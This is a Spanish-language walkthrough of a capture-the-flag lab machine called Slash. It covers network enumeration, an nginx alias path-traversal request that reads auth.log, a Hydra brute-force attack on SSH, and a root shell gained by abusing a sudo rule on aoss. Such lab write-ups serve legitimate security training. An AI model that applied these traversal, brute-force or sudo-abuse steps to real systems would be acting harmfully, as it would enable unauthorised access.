---
date: 2023-08-21 12:00:00
layout: post
title: Slash Writeup
subtitle: Writeup de la máquina Slash de la plataforma Vulnyx
description: En esta maquina nos aprovecharemos de una misconfiguration para realizar una Path Traversal para conseguir informacion de los usuarios del sistema y con esta hacer un Bruteforce al servicio ssh.
image: https://raw.githubusercontent.com/VulNyx/vulnyx.github.io/main/assets/logo-og.png
optimized_image: https://raw.githubusercontent.com/VulNyx/vulnyx.github.io/main/assets/logo-og.png
category: Writeup
tags:
  - Vulnyx
  - Writeup
  - Linux
  - Misconfiguration
  - Easy
  - Bruteforce
  - Path Traversal
author: FredBrave
---
# Enumeración
Empezamos escaneando nuestro segmento de red con arp-scan. Esto para encontrar la ip de la máquina víctima.
```bash
❯ sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:53:0c:ba, IPv4: 10.0.2.133
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)
10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)
10.0.2.3        08:00:27:e3:9c:28       (Unknown)
10.0.2.136      08:00:27:14:2d:c1       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.834 seconds (139.59 hosts/sec). 4 responded
```
Una vez obtenido empezamos con los escaneos de nmap, uno rápido para encontrar los puertos abiertos y otro más exhaustivo para encontrar las versiones y servicios corriendo en los puertos.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.0.2.136 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 19:16 EDT
Nmap scan report for 10.0.2.136
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:14:2D:C1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
❯ sudo nmap -p22,80 -sCV 10.0.2.136 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 19:16 EDT
Nmap scan report for _ (10.0.2.136)
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:14:2D:C1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```
# Puerto 80
Enumeramos el puerto 80 intentando encontrar algo de nuestro interés, pero la web principal es solo el index normal del servidor web nginx.

<img class="img" src="/assets/img/machines/Slash/1.png" width="1200">

Aplicando Fuzz a la web encuentro la siguiente ruta.

```bash
❯ ffuf -u http://10.0.2.136/FUZZ -w /home/kali/Utilidades/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.136/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Utilidades/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 10ms]
    * FUZZ: bak
```
En esta ruta no hay nada por lo que comenze a fuzzear dentro de esta en cambio.

```bash
❯ ffuf -u http://10.0.2.136/bak/FUZZ -w /home/kali/Utilidades/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.136/bak/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Utilidades/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 283, Words: 51, Lines: 19, Duration: 11ms]
    * FUZZ: default
```
Al encontrar default y entrar a esta ruta se me descarga el siguiente archivo.

```bash
❯ /usr/bin/cat default
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location /bak {
                alias /var/backups/;
        }
}
```
# Shell como omar
Este archivo es uno de los archivos de configuración de nginx, este sirve para definir las rutas dentro del sistema a las cuales se podrá acceder mediante un alias. Se puede ver que la ruta `/bak` es un alias que conduce a `/var/backups/`. Sin embargo hay una mala configuración en este archivo la cual puede permitir fallas a la hora de acceder a los archivos dentro del sistema, la falla es la siguiente:


```bash
location /bak
```
Para que el alias funciones correctamente este debe estar encerrado con dos `/` si no puede causar fallas de entre las cuales podemos encontrar un `Path Traversal`. Podemos leer más de esto en el siguiente <a href=" https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">artículo</a>. 

<img class="img" src="/assets/img/machines/Slash/2.png" width="1000">

En el artículo nos explica que para lograr el Path Traversal tenemos que aumentar .. en la ruta `/bak`. Lo primero que intente es encontrar el archivo /etc/passwd, pero lamentablemente esta vulnerabilidad solo nos permite saltarnos un directorio hacia arriba, como es un alias hacia `/var/backups/` esto quiere decir que solo tenemos acceso a los archivos y directorios de la ruta `/var` del sistema. Por lo cual lo siguiente que trate de ver es el archivo de logs del ssh debido a que es el único otro servicio activo.


```bash
❯ curl -s -X GET http://10.0.2.136/bak../log/auth.log

Aug 18 14:26:22 slash sshd[600]: Accepted password for omar from 192.168.1.29 port 43394 ssh2
Aug 18 14:26:22 slash sshd[600]: pam_unix(sshd:session): session opened for user omar(uid=1000) by (uid=0)
Aug 18 14:26:22 slash systemd-logind[298]: New session 6 of user omar.
Aug 18 14:26:31 slash sshd[626]: Received disconnect from 192.168.1.29 port 43394:11: disconnected by user
Aug 18 14:26:31 slash sshd[626]: Disconnected from user omar 192.168.1.29 port 43394
Aug 18 14:26:31 slash sshd[600]: pam_unix(sshd:session): session closed for user omar
Aug 18 14:26:31 slash systemd-logind[298]: Session 6 logged out. Waiting for processes to exit.
Aug 18 14:26:31 slash systemd-logind[298]: Removed session 6.
Aug 18 14:26:46 slash sshd[700]: Accepted password for omar from 192.168.1.29 port 59660 ssh2
Aug 18 14:26:46 slash sshd[700]: pam_unix(sshd:session): session opened for user omar(uid=1000) by (uid=0)
Aug 18 14:26:46 slash systemd-logind[298]: New session 7 of user omar.
Aug 18 14:26:50 slash sshd[708]: Received disconnect from 192.168.1.29 port 59660:11: disconnected by user
Aug 18 14:26:50 slash sshd[708]: Disconnected from user omar 192.168.1.29 port 59660
Aug 18 14:26:50 slash sshd[700]: pam_unix(sshd:session): session closed for user omar
Aug 18 14:26:50 slash systemd-logind[298]: Session 7 logged out. Waiting for processes to exit.
Aug 18 14:26:50 slash systemd-logind[298]: Removed session 7.
Aug 18 14:27:12 slash CRON[332]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Aug 18 14:27:12 slash CRON[332]: pam_unix(cron:session): session closed for user root
Aug 18 14:27:12 slash sshd[373]: Server listening on 0.0.0.0 port 22.
Aug 18 14:27:12 slash sshd[373]: Server listening on :: port 22.
Aug 18 14:27:12 slash systemd-logind[315]: New seat seat0.
Aug 18 14:27:12 slash systemd-logind[315]: Watching system buttons on /dev/input/event4 (Power Button)
Aug 18 14:27:12 slash systemd-logind[315]: Watching system buttons on /dev/input/event5 (Sleep Button)
Aug 18 14:27:12 slash systemd-logind[315]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)
Aug 18 14:31:29 slash CRON[328]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Aug 18 14:31:29 slash CRON[328]: pam_unix(cron:session): session closed for user root
Aug 18 14:31:29 slash sshd[362]: Server listening on 0.0.0.0 port 22.
Aug 18 14:31:29 slash sshd[362]: Server listening on :: port 22.
Aug 18 14:31:29 slash systemd-logind[324]: New seat seat0.
Aug 18 14:31:29 slash systemd-logind[324]: Watching system buttons on /dev/input/event4 (Power Button)
Aug 18 14:31:29 slash systemd-logind[324]: Watching system buttons on /dev/input/event5 (Sleep Button)
Aug 18 14:31:29 slash systemd-logind[324]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)
Aug 19 01:33:47 slash CRON[311]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Aug 19 01:33:47 slash CRON[311]: pam_unix(cron:session): session closed for user root
Aug 19 01:33:47 slash sshd[390]: Server listening on 0.0.0.0 port 22.
Aug 19 01:33:47 slash sshd[390]: Server listening on :: port 22.
```
Podemos ver que se han conectado al sistema con el usuario omar por lo que prosigo a hacer un ataque de fuerza bruta al ssh para encontrar las credenciales del usuario.

```bash
❯ hydra ssh://10.0.2.136 -l omar -P /usr/share/wordlists/rockyou.txt -t 64 -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-21 19:51:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.0.2.136:22/
[STATUS] 359.00 tries/min, 359 tries in 00:01h, 14344072 to do in 665:56h, 32 active
[22][ssh] host: 10.0.2.136   login: omar   password: o******
[STATUS] attack finished for 10.0.2.136 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-21 19:54:03
```
Ya con credenciales ingresaremos a la máquina como omar.

```bash
❯ ssh omar@10.0.2.136
omar@10.0.2.136's password: 
omar@slash:~$ whoami
omar
```

# Shell como root

Enumerando encuentro que puedo ejecutar el programa aoss como root.

```bash
omar@slash:~$ sudo -l
Matching Defaults entries for omar on slash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User omar may run the following commands on slash:
    (root) NOPASSWD: /usr/bin/aoss
```
Revisandolo encuentro que tengo permisos de lectura.

```bash
omar@slash:~$ ls -la /usr/bin/aoss
-rwxr-xr-x 1 root root 397 ene 26  2019 /usr/bin/aoss
omar@slash:~$ cat /usr/bin/aoss
#!/bin/sh

# A simple script to facilitate the use of the OSS compatibility library.
# Usage:
#       aoss <command> <command options and arguments>

if [ -d /proc/asound ]; then
  prefix=/usr
  libdir=${prefix}/lib/x86_64-linux-gnu
  LD_PRELOAD=${libdir}/libaoss.so${LD_PRELOAD:+:$LD_PRELOAD} exec "$@"
else
  echo "Warning: /proc/asound not found. Running without ALSA wrapper."
  exec "$@"
fi
exit 1
```
```bash
LD_PRELOAD=${libdir}/libaoss.so${LD_PRELOAD:+:$LD_PRELOAD} exec "$@"
```
Debido al exec "$@" este programa al parecer nos ejecutará todos los parámetros que le pasemos. Entonces lo probamos.

```bash
omar@slash:~$ sudo -u root /usr/bin/aoss id
uid=0(root) gid=0(root) grupos=0(root)
```
Y tenemos ejecucion de comandos como root, por lo cual solo ejecutamos una bash y seremos root.

```bash
omar@slash:~$ sudo -u root /usr/bin/aoss bash
root@slash:/home/omar# whoami
root
```
Hemos pwneado la maquina!!!
